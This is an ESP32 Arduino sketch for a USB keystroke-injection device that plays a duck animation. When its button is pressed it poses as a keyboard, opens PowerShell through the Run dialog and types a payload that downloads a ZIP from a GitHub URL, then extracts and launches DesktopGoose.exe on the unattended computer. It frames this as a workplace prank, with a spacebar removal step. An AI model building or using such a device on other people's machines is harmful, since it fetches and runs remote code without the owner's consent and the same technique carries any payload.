#include <AnimatedGIF.h>
#include <Arduino.h>
#include <ezButton.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <USB.h>
#include <USBHIDKeyboard.h>

#include "duck.h"

#define BUTTON_PIN 0
#define GIF_IMAGE duck

// #define USE_DMA 
#define NORMAL_SPEED
#define DISPLAY_WIDTH  tft.width()
#define DISPLAY_HEIGHT tft.height()
#define BUFFER_SIZE 256            // Optimum is >= GIF width or integral division of width

AnimatedGIF gif;
USBHIDKeyboard Keyboard;
ezButton button(BUTTON_PIN);
TFT_eSPI tft = TFT_eSPI(135, 240);
bool shouldPlayGif = false;
volatile bool usbReady = false;

#ifdef USE_DMA
  uint16_t usTemp[2][BUFFER_SIZE]; // Global to support DMA use
#else
  uint16_t usTemp[1][BUFFER_SIZE];    // Global to support DMA use
#endif
bool     dmaBuf = 0;
  
// Draw a line of image directly on the LCD
void GIFDraw(GIFDRAW *pDraw)
{
  uint8_t *s;
  uint16_t *d, *usPalette;
  int x, y, iWidth, iCount;

  // Display bounds check and cropping
  iWidth = pDraw->iWidth;
  if (iWidth + pDraw->iX > DISPLAY_WIDTH)
    iWidth = DISPLAY_WIDTH - pDraw->iX;
  usPalette = pDraw->pPalette;
  y = pDraw->iY + pDraw->y; // current line
  if (y >= DISPLAY_HEIGHT || pDraw->iX >= DISPLAY_WIDTH || iWidth < 1)
    return;

  // Old image disposal
  s = pDraw->pPixels;
  if (pDraw->ucDisposalMethod == 2) // restore to background color
  {
    for (x = 0; x < iWidth; x++)
    {
      if (s[x] == pDraw->ucTransparent)
        s[x] = pDraw->ucBackground;
    }
    pDraw->ucHasTransparency = 0;
  }

  // Apply the new pixels to the main image
  if (pDraw->ucHasTransparency) // if transparency used
  {
    uint8_t *pEnd, c, ucTransparent = pDraw->ucTransparent;
    pEnd = s + iWidth;
    x = 0;
    iCount = 0; // count non-transparent pixels
    while (x < iWidth)
    {
      c = ucTransparent - 1;
      d = &usTemp[0][0];
      while (c != ucTransparent && s < pEnd && iCount < BUFFER_SIZE )
      {
        c = *s++;
        if (c == ucTransparent) // done, stop
        {
          s--; // back up to treat it like transparent
        }
        else // opaque
        {
          *d++ = usPalette[c];
          iCount++;
        }
      } // while looking for opaque pixels
      if (iCount) // any opaque pixels?
      {
        // DMA would degrtade performance here due to short line segments
        tft.setAddrWindow(pDraw->iX + x, y, iCount, 1);
        tft.pushPixels(usTemp, iCount);
        x += iCount;
        iCount = 0;
      }
      // no, look for a run of transparent pixels
      c = ucTransparent;
      while (c == ucTransparent && s < pEnd)
      {
        c = *s++;
        if (c == ucTransparent)
          x++;
        else
          s--;
      }
    }
  }
  else
  {
    s = pDraw->pPixels;

    // Unroll the first pass to boost DMA performance
    // Translate the 8-bit pixels through the RGB565 palette (already byte reversed)
    if (iWidth <= BUFFER_SIZE)
      for (iCount = 0; iCount < iWidth; iCount++) usTemp[dmaBuf][iCount] = usPalette[*s++];
    else
      for (iCount = 0; iCount < BUFFER_SIZE; iCount++) usTemp[dmaBuf][iCount] = usPalette[*s++];

#ifdef USE_DMA // 71.6 fps (ST7796 84.5 fps)
    tft.dmaWait();
    tft.setAddrWindow(pDraw->iX, y, iWidth, 1);
    tft.pushPixelsDMA(&usTemp[dmaBuf][0], iCount);
    dmaBuf = !dmaBuf;
#else // 57.0 fps
    tft.setAddrWindow(pDraw->iX, y, iWidth, 1);
    tft.pushPixels(&usTemp[0][0], iCount);
#endif

    iWidth -= iCount;
    // Loop if pixel buffer smaller than width
    while (iWidth > 0)
    {
      // Translate the 8-bit pixels through the RGB565 palette (already byte reversed)
      if (iWidth <= BUFFER_SIZE)
        for (iCount = 0; iCount < iWidth; iCount++) usTemp[dmaBuf][iCount] = usPalette[*s++];
      else
        for (iCount = 0; iCount < BUFFER_SIZE; iCount++) usTemp[dmaBuf][iCount] = usPalette[*s++];

#ifdef USE_DMA
      tft.dmaWait();
      tft.pushPixelsDMA(&usTemp[dmaBuf][0], iCount);
      dmaBuf = !dmaBuf;
#else
      tft.pushPixels(&usTemp[0][0], iCount);
#endif
      iWidth -= iCount;
    }
  }
} /* GIFDraw() */

void usbEventHandlerWrapper(void *arg, const char *event_base, int32_t event_id, void *event_data)
{
  switch (event_id)
  {
  case ARDUINO_USB_STARTED_EVENT:
    usbReady = true;
    Serial.println("USB Started. Device is ready.");
    break;
  case ARDUINO_USB_STOPPED_EVENT:
    usbReady = false;
    Serial.println("USB Stopped.");
    break;
  case ARDUINO_USB_SUSPEND_EVENT:
    Serial.println("USB Suspended.");
    break;
  case ARDUINO_USB_RESUME_EVENT:
    Serial.println("USB Resumed.");
    break;
  }
}

void setup()
{
  Serial.begin(115200);
  tft.begin();
  tft.fillScreen(TFT_BLACK);

  gif.begin(BIG_ENDIAN_PIXELS);

  USB.onEvent(usbEventHandlerWrapper);
  USB.begin();
  Keyboard.begin();

  unsigned long timeout = millis() + 5000;
  while (!usbReady && millis() < timeout)
  {
    delay(10);
  }
  Serial.println(usbReady ? "USB is ready." : "USB did not become ready within timeout.");
  Serial.println("PSRAM Size: " + String(ESP.getPsramSize()) + " bytes");

  button.setDebounceTime(50);
}

void sendKeystrokes(const char *text)
{
  while (*text)
  {
    if (usbReady)
    {
      Keyboard.print(*text);
    }
    delay(1); // Small delay to ensure keystrokes register
    text++;
  }
  if (usbReady)
  {
    Keyboard.write(KEY_RETURN);
  }
}

void openPowerShell()
{
  if (!usbReady)
    return;

  // Press Win + R to open the Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(500);

  // Type 'powershell' and press Enter
  sendKeystrokes("powershell");
  Keyboard.write(KEY_RETURN);
  delay(1200);
}

void executePayload()
{
  const char *payload = 
    "$zipPath='.\\DesktopGoose.zip';"
    "$extractPath='.\\DesktopGoose';"
    "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/OwendB1/DesktopGooseDownload/production/DesktopGoose.zip' -OutFile $zipPath;"
    "Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force;"
    "if (Test-Path \"$extractPath\\GooseDesktop.exe\") { Start-Process -FilePath \"$extractPath\\GooseDesktop.exe\" };"
    "Write-Host \"You left your PC unattended at work! That is not super smart....\";"
    "Write-Host \"You've gotten goosed for that reason.\";"
    "Write-Host \"Press Spacebar inside this window to remove it now...\";"
    "while ($true) {"
        "if ([console]::KeyAvailable) {"
            "$key = [console]::ReadKey($true).Key;"
            "if ($key -eq 'Spacebar') {"
                "if (Test-Path \"$extractPath\\Close Goose.bat\") {"
                    "Start-Process -FilePath \"$extractPath\\Close Goose.bat\" -Wait;"
                "};"
                "Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue;"
                "Write-Host \"DesktopGoose has been removed!\";"
                "exit;"
            "}"
        "}"
    "}";


  sendKeystrokes(payload);
  delay(10);
  Keyboard.write(KEY_RETURN);
}

void loop()
{
  button.loop();
  if (button.isReleased())
  {
    Serial.println("Button pressed. Executing HID actions & playing GIF...");
    shouldPlayGif = true;
    openPowerShell();
    executePayload();
  }

  if(shouldPlayGif) {
    if (gif.open((uint8_t *)GIF_IMAGE, sizeof(GIF_IMAGE), GIFDraw)) {
      Serial.println("GIF opened successfully.");
      tft.startWrite();
      while(gif.playFrame(true, NULL)) {
        yield();
      }
      gif.close();
      tft.endWrite();
    } else {
      Serial.println("Failed to open GIF.");
    }
  }
}
